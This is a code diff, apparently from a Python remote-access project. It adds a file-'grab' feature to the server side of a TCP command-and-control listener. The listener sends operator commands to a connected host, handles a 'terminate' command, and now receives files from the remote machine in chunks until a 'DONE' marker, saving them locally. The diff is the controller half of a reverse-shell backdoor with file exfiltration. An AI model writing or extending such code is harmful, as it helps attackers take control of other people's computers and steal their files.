@@ -2,6 +2,25 @@
 
 # for building TCP connection
 import socket
+import os
+
+# this function is for receiving the transfered file
+def transfer(conn, command):
+    conn.send(command) # starting the command
+    f = open('./transfer/test.txt', 'wb') # placeholder file
+    while True:
+        bits = conn.recv(1024) # getting information (1kb at the time)
+        if 'Unable to find out the file' in bits:
+            print("[-] Unable to find out the file")
+            break
+        # check if completed
+        if bits.endswith('DONE'):
+            print("[+] Transfer completed")
+            f.close() # closing the file open
+            break
+        # writing file
+        f.write(bits)
+    f.close()
 
 # low level server interface
 def connect():
@@ -22,7 +41,11 @@ def connect():
         if 'terminate' in command:
             conn.send('terminate')
             conn.close() # closing the connection with host
-            break;
+            break
+        # command for grabbing file
+        elif 'grab' in command:
+            # calling the transfer method
+            transfer(conn,command)
         else:
             # sending command
             conn.send(command)
